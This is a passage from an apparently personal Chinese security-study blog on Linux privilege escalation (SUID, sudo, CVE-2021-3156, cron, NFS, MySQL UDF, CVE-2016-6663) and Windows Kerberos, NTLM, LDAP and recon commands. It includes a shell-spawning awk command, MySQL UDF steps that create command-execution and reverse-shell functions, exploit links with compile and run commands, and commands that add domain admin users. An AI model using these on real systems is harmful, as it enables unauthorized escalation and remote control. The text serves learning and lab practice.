+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152821108.png" srcset="/img/loading.gif" lazyload alt="image-20210720152821108"></p>
+<p><code>mv</code>同理类似</p>
+<p><strong>vim vi nano等编辑器</strong></p>
+<p>可以直接选择写入一个<code>root</code>权限用户，不用网上那种花里胡哨的方法，网上的搞了半天也没有成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720173740391.png" srcset="/img/loading.gif" lazyload alt="image-20210720173740391"></p>
+<p><strong>less/more</strong></p>
+<blockquote>
+<p>暂时没有成功获得权限</p>
+</blockquote>
+<p><strong>awk</strong></p>
+<p><code>awk</code>是一种处理文件的语言，是文本分析工具</p>
+<p> 提权命令：<code>awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></p>
+<blockquote>
+<p>环境没有搭建好，暂时没有成功</p>
+</blockquote>
+<p><strong>总结</strong></p>
+<p>个人感觉<code>suid</code>提权，主要是网站管理人员的疏忽，使用这个方法只能看运气，平时多积累一点各种命令提权的方法</p>
+<h5 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a>SUDO提权</h5><ol>
+<li><p><code>sudo</code>无密码，可以查看<code>/etc/sudoers</code>或者使用<code>sudo -l</code>来查看</p>
+<blockquote>
+<p>经过多次练习，发现sudo提权还是很有用的</p>
+</blockquote>
+<p>案例</p>
+<p><code>sudo -l</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142203251.png" srcset="/img/loading.gif" lazyload alt="image-20210818142203251"></p>
+<p>执行命令<code>sudo apt changelog apt</code>提权</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142004907.png" srcset="/img/loading.gif" lazyload alt="image-20210818142004907"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142230467.png" srcset="/img/loading.gif" lazyload alt="image-20210818142230467"></p>
+</li>
+<li><p>CVE-2021-3156</p>
+<p>漏洞原因：当<code>sudo</code>通过<code>-s</code>或者<code>-i</code>命令行选项在shell模式下运行命令是，它会把命令参数中使用反斜杠转义特殊字符，但是使用<code>-s</code>或者<code>-i</code>标志运行sudoedit时，实际上并没有进行转义，从而导致了缓冲区溢出漏洞，只要存在sudoers文（/etc/sudoers），就可以提权了。</p>
+<p>影响版本：<code>sudo 1.8.2-1.8.31p2   1.9.0-1.9.5p1</code></p>
+<p>漏洞检测：<code>sudo --verison</code> 查看版本</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721095440738.png" srcset="/img/loading.gif" lazyload alt="image-20210721095440738"></p>
+<p>利用exp来提权：<a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156%EF%BC%8C%E6%B2%A1%E6%9C%89%E5%8F%91%E7%8E%B0%E9%80%82%E5%90%88ubuntu16.04%E7%89%88%E6%9C%AC%E7%B3%BB%E7%BB%9F%E7%9A%84exp%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BD%BF%E7%94%A818.04%E7%89%88%E6%9C%AC%E6%9D%A5%E6%B5%8B%E8%AF%95%E3%80%82">https://github.com/blasty/CVE-2021-3156，没有发现适合ubuntu16.04版本系统的exp，所以使用18.04版本来测试。</a></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721102908854.png" srcset="/img/loading.gif" lazyload alt="image-20210721102908854"></p>
+<p>先make，然后执行文件，选择相应的系统即可（这里提供的选择比较少，也没有找到其他合适的exp）</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721104615754.png" srcset="/img/loading.gif" lazyload alt="image-20210721104615754"></p>
+</li>
+</ol>
+<blockquote>
+<p><del>感觉SUDO提权没有SUID提权舒服</del></p>
+</blockquote>
+<h5 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h5><p>crontab命令用来定期执行程序</p>
+<p>语法格式</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">-e   编辑当前的crontab文件，默认保存在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>用户名下<br>-r   删除目前的时程表<br>-l   列出目前的时程表<br><br><br>分 时 日 月 周 需要执行的命令<br><br>分：<span class="hljs-number">0</span>~<span class="hljs-number">59</span><br>时：<span class="hljs-number">0</span>~<span class="hljs-number">23</span><br>日：<span class="hljs-number">1</span>~<span class="hljs-number">31</span><br>月：<span class="hljs-number">1</span>~<span class="hljs-number">12</span><br>周：<span class="hljs-number">0</span>~<span class="hljs-number">6</span> <span class="hljs-comment">#0代表周日</span><br>*：（星号）代表取值范围中的每一个数字<br>-：（减号）连续区间表达式，想要代表<span class="hljs-number">1</span>~<span class="hljs-number">7</span>，则需要写成<span class="hljs-number">1</span>-<span class="hljs-number">7</span><br><span class="hljs-regexp">/：（斜杠）表示每x个。例如想在每10分钟执行一次，则在分的位置写：*/</span><span class="hljs-number">10</span><br>,：（逗号）表示多个取值。如果想在<span class="hljs-number">1</span>点，<span class="hljs-number">3</span>点，<span class="hljs-number">5</span>点执行一次，则在时的位置写：<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span><br><br>*<span class="hljs-regexp">/2 * * * * echo `date` &gt;&gt; /</span>tmp/stu01<br>表示每两分钟输出时间到<span class="hljs-regexp">/tmp/</span>stu01文件<br><br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/u</span>ser 用来区分每个用户自己的执行计划<br><span class="hljs-regexp">/etc/</span>crontab 表示系统执行计划，需要在五个*后面加上用户<br>	*<span class="hljs-regexp">/1 * * * * root  ls /</span>&gt;&gt; <span class="hljs-regexp">/tmp/</span>cron<br><span class="hljs-regexp">/etc/</span>cron.deny   表示只拒绝哪些用户不能他用crontab，默认存在空文件<br><span class="hljs-regexp">/etc/</span>cron.allow  表示只允许哪些用户使用crontab<br><br>查看定时任务：cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure>
+
+<p>原理就是通过修改root用户的定时任务的内容来提权</p>
+<ol>
+<li><p>root权限的定时任务脚本普通用户可写</p>
+<ul>
+<li>root权限执行的定时任务或者其所在的文件夹，地权限用户拥有写权限，则可以进行提权</li>
+</ul>
+<p>首先以root用户的身份创建了一个定时任务，每分钟向文件中写入字符串</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721112724742.png" srcset="/img/loading.gif" lazyload alt="image-20210721112724742"></p>
+<blockquote>
+<p> 本地测试时后默认的<code>/var/spool/cron/crontabs</code>普通用户没有可读权限</p>
+</blockquote>
+<p>这里使用普通用户修改root用户的定时脚本</p>
+<p>修改定时任务内容提权的方法就有很多了，可以直接添加用户，反弹shell，…………</p>
+</li>
+<li><p>root权限的定时任务调用的脚本普通用户可写</p>
+<ul>
+<li>定时任务可能并不是孤立存在的，他会调用很多别的shell脚本来完成操作，root权限定时任务调用的脚本也是以root权限执行的</li>
+</ul>
+<p>这个的大致过程和上面的一样</p>
+</li>
+</ol>
+<blockquote>
+<p>对于计划任务提权的方法，需要有对一些文件的可写可读权限，限制还是比较大的，不是特别方便。</p>
+</blockquote>
+<h5 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h5><p>NFS（网络文件系统），是一个客户端/服务端应用程序，是一个共享目录。</p>
+<p>执行<code>cat /etc/exports</code> 如果有<code>no_root_squash</code>字样，就说明root用户对共享目录有很高的权限控制，就像在本地一样，我们在获得一台机器的root权限后就可以通过nfs在另一台低权限机器上实现提权。</p>
+<p>提权的过程就是利用高权限主机在共享目录中创建复制一个bash，然后再赋予suid权限，这样就可以提权了</p>
+<blockquote>
+<p>平时遇到情况不多</p>
+</blockquote>
+<h5 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h5><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+<ol>
+<li><p>UDF提权</p>
+<p><strong>原理</strong>：用户通过数据库中的自定义函数功能，添加新的函数。</p>
+<p><strong>攻击过程</strong></p>
+<ol>
+<li><p>选择动态链接库</p>
+<p>如果是 MySQL&gt;=5.1 版本，就必须把UDF的动态链接库文件放置于MySQL安装目录下的lib\plugin文件夹下面才能创建自定义函数，动态链接库文件在常用的sqlmap（/data/udf/mysql）和MSF（/embedded/framework/data/exploits/mysql）中就有</p>
+<blockquote>
+<p>sqlmap中的动态链接库为了防止被误杀都被经过了编码处理，需要使用sqlmap自带的解码工具解码后使用（/extra/cloak/cloak.py）</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>找到靶机中动态链接库的存放位置</p>
+<p><code>show variables like &#39;%plugin%&#39;;</code></p>
+<blockquote>
+<p>如果不存在，可以依靠自己手工在MySQL的安装目录创建\lib\plugin文件夹</p>
+<p>寻找安装目录：select @@basedir;</p>
+</blockquote>
+</li>
+<li><p>写入动态链接库</p>
+<ul>
+<li><p>有SQL注入并且是最高权限，plugin目录可以写入并且需要<code>secure_file_priv</code>无限制，MySQL插件目录可以被MySQL写入，这个时候就可以使用sqlmap上传动态链接库，GET请求有字节长度限制，所以一般POST请求才可以执行这样的攻击。</p>
+</li>
+<li><p>无SQL注入就直接操作SQL语句，当<code>secure_file_priv</code>无限制的时候，我们也可以直接写入plugin目录下</p>
+<ul>
+<li><p>写入时最好将内容使用十六进制编码再写入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">seler 0x………… into dumpfile path;<br>outfile：多行写入<br>dumpfile：单行写入<br>如脱库时，那就用outfile更好使，但是如果用outfife去导出二进制文件时，就会出错，因为outfile函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏，所以一般导出导出二进制文件(udf提权)时就用dumpfile<br><br>获取十六进制<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>)) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">&#x27;/tmp/udf.txt&#x27;</span>; 导入文件中方便观察<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>也可以先写入小马，获取shell，再直接上传文件</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>创建自定义函数，并调用命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">STRING</span> <span class="hljs-keyword">SONAME</span> <span class="hljs-string">&#x27;udf.dll&#x27;</span>; 创建函数<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func; 查询是否新增了函数<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&quot;whoami&quot;</span>); 执行命令<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval; 删除自定义函数<br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<blockquote>
+<p>如果数据库在内网，无法直接连接MySQL或者MySQL不允许外连，我们就可以使用网页脚本（类似于大马）PHP大马脚本：<a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php%EF%BC%9B%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8Navicat%E7%BB%93%E5%90%88%E5%AE%83%E8%87%AA%E5%B8%A6%E7%9A%84tunnel%E9%9A%A7%E9%81%93%E8%84%9A%E6%9C%AC%E6%90%AD%E5%BB%BAHTTP%E9%80%9A%E9%81%93%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php；也可以使用Navicat结合它自带的tunnel隧道脚本搭建HTTP通道连接数据库。</a></p>
+</blockquote>
+<p><strong>反弹shell</strong></p>
+<p>使用被定制好的动态链接库，调用函数来执行命令，反弹shell等</p>
+<p>工具下载：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">https://sqlsec.lanzoux.com/iEQA0ijfu6d</a></p>
+<p>同样的导入然后创建函数</p>
+<p><code>CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</code></p>
+<p>反弹shell</p>
+<p><code>select backshell(&quot;IP&quot;, port);</code></p>
+</li>
+<li><p>MOF提权</p>
+<p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。总结Windows的时候再仔细补充。</p>
+</li>
+<li><p>启动项提权</p>
+<p>常见于Windows，后面Windows提权的时候在补充</p>
+</li>
+<li><p>CVE-2016-6663</p>
+<p><strong>漏洞详情</strong>：竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限，要获取root用户权限，需要结合之前的提权方法进一步操作。</p>
+<p><strong>漏洞条件：</strong></p>
+<ol>
+<li>Getshell 拿到 www-data 权限</li>
+<li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li>
+<li>关键提取步骤需要在交互环境下，所以需要反弹shell</li>
+<li>MySQL版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li>
+<li>MariaDB版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li>
+</ol>
+<p><strong>漏洞复现</strong></p>
+<p>环境搭建：使用国光师傅的docker环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 拉取镜像</span><br>docker pull sqlsec/cve-2016-6663<br><span class="hljs-comment"># 部署镜像</span><br>docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663<br></code></pre></td></tr></table></figure>
+
+<p>连接上shell，获得一个低权限用户密码</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721164602551.png" srcset="/img/loading.gif" lazyload alt="image-20210721164602551"></p>
+<p>上传EXP，并且编译执行</p>
+<p>​    EXP：<a target="_blank" rel="noopener" href="https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c">https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p>
+<p>​    编译EXP：<code>gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</code></p>
+<p>​    执行EXP进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库<br><br>./mysql-privesc-race <span class="hljs-built_in">test</span> 123456 localhost <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+<p>使用蚁剑，冰蝎直接执行有提权问题，所以还是需要反弹shell执行</p>
+<p>提权成功，进一步提权上面指出需要<code>CVE-2016-6662 or CVE-2016-6664</code>，也可以看看有没有其他的提权漏洞</p>
+</li>
+</ol>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p><a target="_blank" rel="noopener" href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p>
+<blockquote>
+<p>感觉对于Windows用的比较多的还是图形化界面，命令的使用不是特别多</p>
+</blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig /all 查看IP<br>whoami 查看当前用户<br>systmeinfo 查看详细信息<br>netstat -ano 查看端口开放情况<br>tracert ip/域名  路由追踪<br>ping 检测主机之间的连通性<br>ipconfig /fulshdns 刷新本地DNS缓存<br><br>tasklist 显示当前运行的进程<br>taskkill /pid pidnum 结束进程<br>net start 显示当前运行的服务<br>net start 服务名  启动服务<br>net stop 服务名  停止指定服务<br>net statistics workstation 查看系统开机时间<br><br>dir 列出当前目录文件<br>d:   e:  切换到对应磁盘<br>tree 显示目录结构<br><br>添加用户  net<span class="hljs-built_in"> user </span>username password  /add<br>添加域用户 net<span class="hljs-built_in"> user </span>username password /<span class="hljs-builtin-name">add</span> /domain<br>添加用户到域管 net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Admins&quot;</span> username /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure>
+
+<h4 id="Windows协议"><a href="#Windows协议" class="headerlink" title="Windows协议"></a>Windows协议</h4><h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><p><a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p>
+<p>Kerberos协议是一种计算机网络认证协议，它可以为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。主要用于域环境</p>
+<p>协议的组成：</p>
+<ul>
+<li><p>客户端（client）</p>
+</li>
+<li><p>服务端（Server）</p>
+</li>
+<li><p>密钥分发中心（KDC）：密钥分发中心又分为两部分</p>
+<ul>
+<li>AS：认证服务器，专门用来认证客户端身份并发放客户用户访问TGS的TGT（票据授予票据）</li>
+<li>TGS：票据授予服务器</li>
+</ul>
+<blockquote>
+<p>KDC与在域控运行的其他安全服务集成，KDC使用域的AD域服务器数据库作为其安全数据库，AD域服务是域或林中默认的Kerberos实现必须的。一般情况下KDC安装在域控中，Client和Server为域内的用户或者服务</p>
+</blockquote>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722100209527.png" srcset="/img/loading.gif" lazyload alt="image-20210722100209527"></p>
+<p>认证流程（身份认证服务交换，票据授权服务交换，客户端/服务认证交换）</p>
+<ol>
+<li><p>Client先向KDC发起请求，请求的凭据就是Client hash加密的时间戳</p>
+</li>
+<li><p>KDC使用Client hash解密，如果正确就返回解密的TGT，TGT中包含了PAC，PAC中包含了Client的sid，Client所在的组</p>
+<blockquote>
+<p>PAC(Privilege Attribute Certificate)特权属性证书，不同账户有不同的权限，PAC就是用来区分不同权限的</p>
+</blockquote>
+</li>
+<li><p>Client凭借TGT票据向KDC发起针对特定服务的请求</p>
+</li>
+<li><p>KDC解密，如果正确就返回加密的TGS（不管用户有没有访问权限，TGT正确就会返回TGS票据）</p>
+</li>
+<li><p>Client拿着TGS票据去请求服务</p>
+</li>
+<li><p>Server解密TGS，验证身份</p>
+</li>
+</ol>
+</li>
+</ul>
+<p>相关漏洞：MS14-068利用kerberos漏洞获取到域控权限，黄金票据，白银票据</p>
+<h5 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h5><p>Windows内部只保存了密码的hash，并不保存明文密码，本机用户的hash保存在本地的<strong>SAM文件</strong>中，当我们登录系统时，系统会自动读取SAM文件中的密码与我们输入的密码对比，是否相同；域内用户的hash保存在域控的<strong>NTDS.dit</strong>文件中</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722110852458.png" srcset="/img/loading.gif" lazyload alt="image-20210722110852458"></p>
+<ul>
+<li>NTLM Hash 是支持Net NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成</li>
+<li><strong>Windows本身不存储用户的明文密码</strong>，它会将用户的明文密码经过加密算法后存储在SAM数据库中</li>
+<li>当用户登录的时候，将用户输入的明文密码也加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较</li>
+</ul>
+<p>LM Hash是windows早期用的加密算法，为了解决LM加密和身份验证中的固有的安全弱点，有了NTLM协议，从Windows7 和 windows server 2008开始，系统默认只会存储NTLM Hash。</p>
+<p>NTLM Hash的产生过程</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804094211071.png" srcset="/img/loading.gif" lazyload alt="image-20210804094211071"></p>
+<p>本地认证流程</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804095544847.png" srcset="/img/loading.gif" lazyload alt="image-20210804095544847"></p>
+<p>NTLM协议包括了NTLMv1和NTLMv2两个版本，NTLM验证是一种Challenge/Reaponse 验证机制，由三种消息组成：</p>
+<ol>
+<li>协商：确认双方版本</li>
+<li>质询：是Challenge / Response 认证机制起作用的范畴</li>
+<li>验证：完成质询后，验证结果</li>
+</ol>
+<p>质询流程：</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804103007109.png" srcset="/img/loading.gif" lazyload alt="image-20210804103007109"></p>
+<ol>
+<li>客户端向服务器端发送用户信息（用户名）请求</li>
+<li>服务器接搜到请求，判断本地账户列表中是否有对应的而用户名，如果有就生成一个Challenge，使用登录用户名对应的NTLM Hash加密Challenge，生成一个<strong>Net-NTLM Hash存在于内存</strong>中，生成后将Challenge发送给客户端（NTLMv1的Challenge是8位，NTLMv2的Challenge是16位）</li>
+<li>客户端接搜到Challenge后使用将要扽牢固到账户对应的NTLM Hash加密Challenge生成Reaponse，然后将Response发送到服务端</li>
+</ol>
+<p>验证：服务端收到客户端的Response后对比Net-NTLM Hash 和Response是否相同。</p>
+<p>相关漏洞：Hash传递攻击（PTH）</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11343859.html">https://www.cnblogs.com/-qing-/p/11343859.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p>
+<h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>Active Directory（活动目录）</p>
+<ol>
+<li><p>概念</p>
+<ul>
+<li><p>Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。它使用了一种结构化的数据存储方法，并且以此为基础对目录信息进行呵护逻辑的分层组织。</p>
+<blockquote>
+<p>网络对象：用户，用户组，计算机，域，组织单位以及安全策略等</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>活动目录的功能</p>
+<ul>
+<li>服务器以及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略</li>
+<li>用户服务：管理用户域账户，用户信息，企业通讯录，用户组管理，用户身份认证，用户授权管理等</li>
+<li>资源管理：管理打印机，文件共享服务等网络资源</li>
+<li>桌面配置：系统管理员可以集中的配置各种桌面配置策略</li>
+<li>应用系统支撑</li>
+</ul>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/">https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/147768058">https://zhuanlan.zhihu.com/p/147768058</a></p>
+<p>LDAP（轻量目录访问协议）：约定了Client与Server之间的信息交互格式，使用端口号，认证方式等内容。微软的<code>Active Directory</code>就是依靠LDAP实现的，AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。<code>OpenLDAP</code> 是可以运行在 Linux 上的 LDAP 协议的开源实现。平常说的 LDAP Server，一般指的是安装并配置了 <code>Active Directory</code>、<code>OpenLDAP</code> 这些程序的服务器。</p>
+<p>LDAP 的目录树概念:</p>
+<ol>
+<li><p>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是 一个条目。</p>
+</li>
+<li><p>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称(DN)。</p>
+</li>
+<li><p>对象类：objectClass，与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属</p>
+<p>性也会被继承下来。</p>
+</li>
+<li><p>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</p>
+</li>
+</ol>
+<h4 id="工作组-域信息收集"><a href="#工作组-域信息收集" class="headerlink" title="工作组/域信息收集"></a>工作组/域信息收集</h4><h5 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros">whoami <span class="hljs-built_in">/user </span>查看当前用户<br>whoami /priv 查看当前用户权限<br>ipconfig /all 查看网络配置<br>nestat -ano  查看端口列表<br>systeminfo 查看系统信息<br>net share 查看本机共享<br>cmdkey /l 远程桌面连接历史记录<br>net<span class="hljs-built_in"> user </span>查看本机上的用户列表<br>net<span class="hljs-built_in"> user </span>name 查看本机用户具体信息<br>net localgroup administrators 获取本地管理员（通常包含域用户）信息<br>query<span class="hljs-built_in"> user </span>|| qwinsta 查看当前在线用户<br>route <span class="hljs-builtin-name">print</span> 查看路由表缓存<br>arp -a 路由缓存<br><br>wmic OS <span 